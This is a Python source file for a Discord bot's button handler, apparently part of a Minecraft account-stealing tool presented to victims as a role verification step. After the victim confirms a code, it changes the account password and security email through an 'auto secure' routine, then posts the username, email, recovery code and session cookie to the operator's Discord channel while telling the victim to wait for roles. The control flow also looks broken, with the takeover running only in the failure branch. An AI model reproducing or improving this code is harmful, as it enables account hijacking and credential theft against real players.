import discord
import json
from discord import ui
import json
import data
import discord
import time
from discord import ui
from views.otp import automate_auto_change, CreateRandomEmail, generate_password


config = json.load(open("config.json", "r+"))
class ButtonViewFour(ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="✅ Confirmed Code", style=discord.ButtonStyle.green, custom_id="persistent:button_four")
    async def button_four(self, interaction: discord.Interaction, button: discord.ui.Button):
        newgenpassword = generate_password()
        TempEmail = await CreateRandomEmail()
        
        email = data.LastUsedEmail

        logs_channel = interaction.client.get_channel(config["logs_channel"])
        accounts_channel = interaction.client.get_channel(config["accounts_channel"])

        embed = discord.Embed(
            title="Code Confirmed",
            description="If Code Was Correct Please Wait To Receive Details",
            color=0xA2574F
        )

        if TempEmail is not None:
            embedsecure = discord.Embed(
                title="Auto Secure",
                colour=0x9900FF
            )
        else:
            embedfail = discord.Embed(
                title="Auto Secure Failed",
                description="Failed To Auto Create Email. Double Check Your API Key For MailSlurp.",
                colour=0xFF0000
            )

            await logs_channel.send(embed=embedfail)

            # Securing Process
            starttime = time.time()
            await automate_auto_change(email, None, TempEmail, newgenpassword)
            endtime = time.time()
            timetotal = endtime - starttime
            
            if data.LastCookie == "": #Fail Code
                embedfailsecure = discord.Embed(title="Auto Fail",colour=0xFF0000)
                embedfailsecure.add_field(name="**Minecraft Username:**", value=f"```{data.LastUserName}```", inline=False)
                embedfailsecure.set_thumbnail(url= f"https://mc-heads.net/avatar/{data.LastUserName}.png")
                await logs_channel.send(embed=embedfailsecure)
            else:
                embedsecure.add_field(name="**Minecraft Username:**", value=f"```{data.LastUserName}```", inline=True)
                embedsecure.add_field(name="**Email:**", value=f"```{data.LastUsedEmail}```", inline=True)
                embedsecure.add_field(name="**Recovery Code:**", value=f"```{data.LastRecoveryCode}```", inline=False)
                embedsecure.add_field(name="**Security Email (Only Valid For 24Hours):**", value=f"```{TempEmail}```", inline=True)
                embedsecure.add_field(name="**Cookie:**", value=f"```{data.LastCookie}```", inline=False)
                embedsecure.add_field(name="**Time Taken:**", value=f"```{timetotal}```", inline=False)
                embedsecure.set_thumbnail(url= f"https://mc-heads.net/avatar/{data.LastUserName}.png")
                await accounts_channel.send(embed=embedsecure)

        await interaction.response.send_message("⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True)
 